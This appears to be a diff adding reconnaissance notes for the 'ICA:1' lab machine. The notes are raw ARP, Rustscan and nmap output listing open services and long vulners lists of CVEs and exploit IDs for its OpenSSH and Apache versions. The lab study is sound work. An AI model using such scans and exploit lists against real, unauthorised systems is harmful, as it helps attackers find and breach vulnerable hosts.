@@ -1,0 +1,2737 @@
+ICA:1
+
+Obtaining IP address:
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                             
+                                                                                                                                                                                           
+ 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                                                                                                                           
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                          
+ 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                          
+ 10.0.2.3        08:00:27:c0:44:97      1      60  PCS Systemtechnik GmbH                                                                                                                  
+ 10.0.2.8        08:00:27:ff:99:b8      2     120  PCS Systemtechnik GmbH     
+
+
+
+ Rustscan:
+
+ PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack ttl 64
+80/tcp    open  http    syn-ack ttl 64
+3306/tcp  open  mysql   syn-ack ttl 64
+33060/tcp open  mysqlx  syn-ack ttl 64
+MAC Address: 08:00:27:FF:99:B8 (Oracle VirtualBox virtual NIC)
+
+
+
+nmap:
+ORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.4p1: 
+|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
+|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
+|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
+|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
+|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
+|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
+|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
+|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
+|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
+|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
+|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
+|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
+|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
+|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
+|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
+|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
+|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
+|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
+|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
+|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
+|       CC3AE4FC-CF04-5EDA-A010-6D7E71538C92    5.9     https://vulners.com/githubexploit/CC3AE4FC-CF04-5EDA-A010-6D7E71538C92  *EXPLOIT*
+|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
+|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
+|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
+|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
+|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.48 ((Debian))
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.0.2.8
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.0.2.8:80/
+|     Form id: loginform
+|     Form action: http://10.0.2.8/index.php/login
+|     
+|     Path: http://10.0.2.8:80/index.php/login
+|     Form id: loginform
+|     Form action: http://10.0.2.8/index.php/login
+|     
+|     Path: http://10.0.2.8:80/index.php/login/restorePassword
+|     Form id: restorepassword
+|_    Form action: /index.php/login/restorePassword
+|_http-server-header: Apache/2.4.48 (Debian)
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.48: 
+|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
+|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
+|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
+|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
+|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
+|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
+|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
+|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
+|       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
+|       F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5    9.8     https://vulners.com/githubexploit/F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5  *EXPLOIT*
+|       F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8    9.8     https://vulners.com/githubexploit/F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8  *EXPLOIT*
+|       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
+|       F41EE867-4E63-5259-9DF0-745881884D04    9.8     https://vulners.com/githubexploit/F41EE867-4E63-5259-9DF0-745881884D04  *EXPLOIT*
+|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
+|       EDB-ID:50512    9.8     https://vulners.com/exploitdb/EDB-ID:50512      *EXPLOIT*
+|       EDB-ID:50446    9.8     https://vulners.com/exploitdb/EDB-ID:50446      *EXPLOIT*
+|       EDB-ID:50406    9.8     https://vulners.com/exploitdb/EDB-ID:50406      *EXPLOIT*
+|       E81474F6-6DDC-5FC2-828A-812A8815E3B4    9.8     https://vulners.com/githubexploit/E81474F6-6DDC-5FC2-828A-812A8815E3B4  *EXPLOIT*
+|       E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6    9.8     https://vulners.com/githubexploit/E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6  *EXPLOIT*
+|       E59A01BE-8176-5F5E-BD32-D30B009CDBDA    9.8     https://vulners.com/githubexploit/E59A01BE-8176-5F5E-BD32-D30B009CDBDA  *EXPLOIT*
+|       D7922C26-D431-5825-9897-B98478354289    9.8     https://vulners.com/githubexploit/D7922C26-D431-5825-9897-B98478354289  *EXPLOIT*
+|       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52  *EXPLOIT*
+|       D10426F3-DF82-5439-AC3E-6CA0A1365A09    9.8     https://vulners.com/githubexploit/D10426F3-DF82-5439-AC3E-6CA0A1365A09  *EXPLOIT*
+|       D0368327-F989-5557-A5C6-0D9ACDB4E72F    9.8     https://vulners.com/githubexploit/D0368327-F989-5557-A5C6-0D9ACDB4E72F  *EXPLOIT*
+|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
+|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
+|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
+|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-42013  9.8     https://vulners.com/cve/CVE-2021-42013
+|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
+|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
+|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
+|       CC15AE65-B697-525A-AF4B-38B1501CAB49    9.8     https://vulners.com/githubexploit/CC15AE65-B697-525A-AF4B-38B1501CAB49  *EXPLOIT*
+|       C879EE66-6B75-5EC8-AA68-08693C6CCAD1    9.8     https://vulners.com/githubexploit/C879EE66-6B75-5EC8-AA68-08693C6CCAD1  *EXPLOIT*
+|       C5A61CC6-919E-58B4-8FBB-0198654A7FC8    9.8     https://vulners.com/githubexploit/C5A61CC6-919E-58B4-8FBB-0198654A7FC8  *EXPLOIT*
+|       BF9B0898-784E-5B5E-9505-430B58C1E6B8    9.8     https://vulners.com/githubexploit/BF9B0898-784E-5B5E-9505-430B58C1E6B8  *EXPLOIT*
+|       B81BC21D-818E-5B33-96D7-062C14102874    9.8     https://vulners.com/githubexploit/B81BC21D-818E-5B33-96D7-062C14102874  *EXPLOIT*
+|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
+|       ACD5A7F2-FDB2-5859-8D23-3266A1AF6795    9.8     https://vulners.com/githubexploit/ACD5A7F2-FDB2-5859-8D23-3266A1AF6795  *EXPLOIT*
+|       A90ABEAD-13A8-5F09-8A19-6D9D2D804F05    9.8     https://vulners.com/githubexploit/A90ABEAD-13A8-5F09-8A19-6D9D2D804F05  *EXPLOIT*
+|       A8616E5E-04F8-56D8-ACB4-32FDF7F66EED    9.8     https://vulners.com/githubexploit/A8616E5E-04F8-56D8-ACB4-32FDF7F66EED  *EXPLOIT*
+|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
+|       A3F15BCE-08AD-509D-AE63-9D3D8E402E0B    9.8     https://vulners.com/githubexploit/A3F15BCE-08AD-509D-AE63-9D3D8E402E0B  *EXPLOIT*
+|       A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A    9.8     https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A  *EXPLOIT*
+|       9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5    9.8     https://vulners.com/githubexploit/9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5  *EXPLOIT*
+|       907F28D0-5906-51C7-BAA3-FEBD5E878801    9.8     https://vulners.com/githubexploit/907F28D0-5906-51C7-BAA3-FEBD5E878801  *EXPLOIT*
+|       8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677    9.8     https://vulners.com/githubexploit/8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677  *EXPLOIT*
+|       88EB009A-EEFF-52B7-811D-A8A8C8DE8C81    9.8     https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81  *EXPLOIT*
+|       8713FD59-264B-5FD7-8429-3251AB5AB3B8    9.8     https://vulners.com/githubexploit/8713FD59-264B-5FD7-8429-3251AB5AB3B8  *EXPLOIT*
+|       866E26E3-759B-526D-ABB5-206B2A1AC3EE    9.8     https://vulners.com/githubexploit/866E26E3-759B-526D-ABB5-206B2A1AC3EE  *EXPLOIT*
+|       86360765-0B1A-5D73-A805-BAE8F1B5D16D    9.8     https://vulners.com/githubexploit/86360765-0B1A-5D73-A805-BAE8F1B5D16D  *EXPLOIT*
+|       831E1114-13D1-54EF-BDE4-F655114CDC29    9.8     https://vulners.com/githubexploit/831E1114-13D1-54EF-BDE4-F655114CDC29  *EXPLOIT*
+|       805E6B24-8DF9-51D8-8DF6-6658161F96EA    9.8     https://vulners.com/githubexploit/805E6B24-8DF9-51D8-8DF6-6658161F96EA  *EXPLOIT*
+|       7E615961-3792-5896-94FA-1F9D494ACB36    9.8     https://vulners.com/githubexploit/7E615961-3792-5896-94FA-1F9D494ACB36  *EXPLOIT*
+|       7C40F14D-44E4-5155-95CF-40899776329C    9.8     https://vulners.com/githubexploit/7C40F14D-44E4-5155-95CF-40899776329C  *EXPLOIT*
+|       78787F63-0356-51EC-B32A-B9BD114431C3    9.8     https://vulners.com/githubexploit/78787F63-0356-51EC-B32A-B9BD114431C3  *EXPLOIT*
+|       6CAA7558-723B-5286-9840-4DF4EB48E0AF    9.8     https://vulners.com/githubexploit/6CAA7558-723B-5286-9840-4DF4EB48E0AF  *EXPLOIT*
+|       6BCBA83C-4A4C-58D7-92E4-DF092DFEF267    9.8     https://vulners.com/githubexploit/6BCBA83C-4A4C-58D7-92E4-DF092DFEF267  *EXPLOIT*
+|       6A0A657E-8300-5312-99CE-E11F460B1DBF    9.8     https://vulners.com/githubexploit/6A0A657E-8300-5312-99CE-E11F460B1DBF  *EXPLOIT*
+|       68A13FF0-60E5-5A29-9248-83A940B0FB02    9.8     https://vulners.com/githubexploit/68A13FF0-60E5-5A29-9248-83A940B0FB02  *EXPLOIT*
+|       64D31BF1-F977-51EC-AB1C-6693CA6B58F3    9.8     https://vulners.com/githubexploit/64D31BF1-F977-51EC-AB1C-6693CA6B58F3  *EXPLOIT*
+|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C  *EXPLOIT*
+|       61075B23-F713-537A-9B84-7EB9B96CF228    9.8     https://vulners.com/githubexploit/61075B23-F713-537A-9B84-7EB9B96CF228  *EXPLOIT*
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       5312D04F-9490-5472-84FA-86B3BBDC8928    9.8     https://vulners.com/githubexploit/5312D04F-9490-5472-84FA-86B3BBDC8928  *EXPLOIT*
+|       52E13088-9643-5E81-B0A0-B7478BCF1F2C    9.8     https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C  *EXPLOIT*
+|       50453CEF-5DCF-511A-ADAC-FB74994CD682    9.8     https://vulners.com/githubexploit/50453CEF-5DCF-511A-ADAC-FB74994CD682  *EXPLOIT*
+|       495E99E5-C1B0-52C1-9218-384D04161BE4    9.8     https://vulners.com/githubexploit/495E99E5-C1B0-52C1-9218-384D04161BE4  *EXPLOIT*
+|       44E43BB7-6255-58E7-99C7-C3B84645D497    9.8     https://vulners.com/githubexploit/44E43BB7-6255-58E7-99C7-C3B84645D497  *EXPLOIT*
+|       40F21EB4-9EE8-5ED1-B561-0A2B8625EED3    9.8     https://vulners.com/githubexploit/40F21EB4-9EE8-5ED1-B561-0A2B8625EED3  *EXPLOIT*
+|       4051D2EF-1C43-576D-ADB2-B519B31F93A0    9.8     https://vulners.com/githubexploit/4051D2EF-1C43-576D-ADB2-B519B31F93A0  *EXPLOIT*
+|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
+|       37634050-FDDF-571A-90BB-C8109824B38D    9.8     https://vulners.com/githubexploit/37634050-FDDF-571A-90BB-C8109824B38D  *EXPLOIT*
+|       30293CDA-FDB1-5FAF-9622-88427267F204    9.8     https://vulners.com/githubexploit/30293CDA-FDB1-5FAF-9622-88427267F204  *EXPLOIT*
+|       2B3110E1-BEA0-5DB8-93AD-1682230F3E19    9.8     https://vulners.com/githubexploit/2B3110E1-BEA0-5DB8-93AD-1682230F3E19  *EXPLOIT*
+|       2A177215-CE4A-5FA7-B016-EEAF332D165C    9.8     https://vulners.com/githubexploit/2A177215-CE4A-5FA7-B016-EEAF332D165C  *EXPLOIT*
+|       22DCCD26-B68C-5905-BAC2-71D10DE3F123    9.8     https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123  *EXPLOIT*
+|       2108729F-1E99-54EF-9A4B-47299FD89FF2    9.8     https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2  *EXPLOIT*
+|       1C39E10A-4A38-5228-8334-2A5F8AAB7FC3    9.8     https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3  *EXPLOIT*
+|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
+|       1337DAY-ID-37777        9.8     https://vulners.com/zdt/1337DAY-ID-37777        *EXPLOIT*
+|       1337DAY-ID-36952        9.8     https://vulners.com/zdt/1337DAY-ID-36952        *EXPLOIT*
+|       11813536-2AFF-5EA4-B09F-E9EB340DDD26    9.8     https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26  *EXPLOIT*
+|       0C47BCF2-EA6F-5613-A6E8-B707D64155DE    9.8     https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE  *EXPLOIT*
+|       0C28A0EC-7162-5D73-BEC9-B034F5392847    9.8     https://vulners.com/githubexploit/0C28A0EC-7162-5D73-BEC9-B034F5392847  *EXPLOIT*
+|       0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56    9.8     https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56  *EXPLOIT*
+|       07AA70EA-C34E-5F66-9510-7C265093992A    9.8     https://vulners.com/githubexploit/07AA70EA-C34E-5F66-9510-7C265093992A  *EXPLOIT*
+|       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
+|       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
+|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
+|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
+|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
+|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
+|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
+|       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
+|       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
+|       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    9.0     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
+|       DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6    9.0     https://vulners.com/githubexploit/DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6  *EXPLOIT*
+|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
+|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
+|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
+|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C  *EXPLOIT*
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
+|       893DFD44-40B5-5469-AC54-A373AEE17F19    9.0     https://vulners.com/githubexploit/893DFD44-40B5-5469-AC54-A373AEE17F19  *EXPLOIT*
+|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2  *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    9.0     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    9.0     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
+|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F  *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    9.0     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
+|       4427DEE4-E1E2-5A16-8683-D74750941604    8.8     https://vulners.com/githubexploit/4427DEE4-E1E2-5A16-8683-D74750941604  *EXPLOIT*
+|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
+|       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
+|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
+|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
+|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
+|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
+|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
+|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
+|       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
+|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
+|       PACKETSTORM:164941      7.5     https://vulners.com/packetstorm/PACKETSTORM:164941      *EXPLOIT*
+|       PACKETSTORM:164629      7.5     https://vulners.com/packetstorm/PACKETSTORM:164629      *EXPLOIT*
+|       PACKETSTORM:164609      7.5     https://vulners.com/packetstorm/PACKETSTORM:164609      *EXPLOIT*
+|       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
+|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
+|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
+|       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
+|       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
+|       HTTPD:8D3D8562E77EAD24FA6850949D025BC9  7.5     https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
+|       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
+|       FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197    7.5     https://vulners.com/githubexploit/FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197  *EXPLOIT*
+|       FF610CB4-801A-5D1D-9AC9-ADFC287C8482    7.5     https://vulners.com/githubexploit/FF610CB4-801A-5D1D-9AC9-ADFC287C8482  *EXPLOIT*
+|       FDF4BBB1-979C-5320-95EA-9EC7EB064D72    7.5     https://vulners.com/githubexploit/FDF4BBB1-979C-5320-95EA-9EC7EB064D72  *EXPLOIT*
+|       FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46    7.5     https://vulners.com/githubexploit/FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46  *EXPLOIT*
+|       F893E602-F8EB-5D23-8ABF-920890DB23A3    7.5     https://vulners.com/githubexploit/F893E602-F8EB-5D23-8ABF-920890DB23A3  *EXPLOIT*
+|       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
+|       F463914D-1B20-54CA-BF87-EA28F3ADE2A3    7.5     https://vulners.com/githubexploit/F463914D-1B20-54CA-BF87-EA28F3ADE2A3  *EXPLOIT*
+|       EDB-ID:50383    7.5     https://vulners.com/exploitdb/EDB-ID:50383      *EXPLOIT*
+|       ECD5D758-774C-5488-B782-C8996208B401    7.5     https://vulners.com/githubexploit/ECD5D758-774C-5488-B782-C8996208B401  *EXPLOIT*
+|       E9FE319B-26BF-5A75-8C6A-8AE55D7E7615    7.5     https://vulners.com/githubexploit/E9FE319B-26BF-5A75-8C6A-8AE55D7E7615  *EXPLOIT*
+|       E7B177F6-FA62-52FE-A108-4B8FC8112B7F    7.5     https://vulners.com/githubexploit/E7B177F6-FA62-52FE-A108-4B8FC8112B7F  *EXPLOIT*
+|       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC  *EXPLOIT*
+|       E6B39247-8016-5007-B505-699F05FCA1B5    7.5     https://vulners.com/githubexploit/E6B39247-8016-5007-B505-699F05FCA1B5  *EXPLOIT*
+|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
+|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
+|       E0EEEDE5-43B8-5608-B33E-75E65D2D8314    7.5     https://vulners.com/githubexploit/E0EEEDE5-43B8-5608-B33E-75E65D2D8314  *EXPLOIT*
+|       E-739   7.5     https://vulners.com/dsquare/E-739       *EXPLOIT*
+|       E-738   7.5     https://vulners.com/dsquare/E-738       *EXPLOIT*
+|       DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D    7.5     https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D  *EXPLOIT*
+|       DBF996C3-DC2A-5859-B767-6B2FC38F2185    7.5     https://vulners.com/githubexploit/DBF996C3-DC2A-5859-B767-6B2FC38F2185  *EXPLOIT*
+|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
+|       D0E79214-C9E8-52BD-BC24-093970F5F34E    7.5     https://vulners.com/githubexploit/D0E79214-C9E8-52BD-BC24-093970F5F34E  *EXPLOIT*
+|       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
+|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
+|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
+|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
+|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
+|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
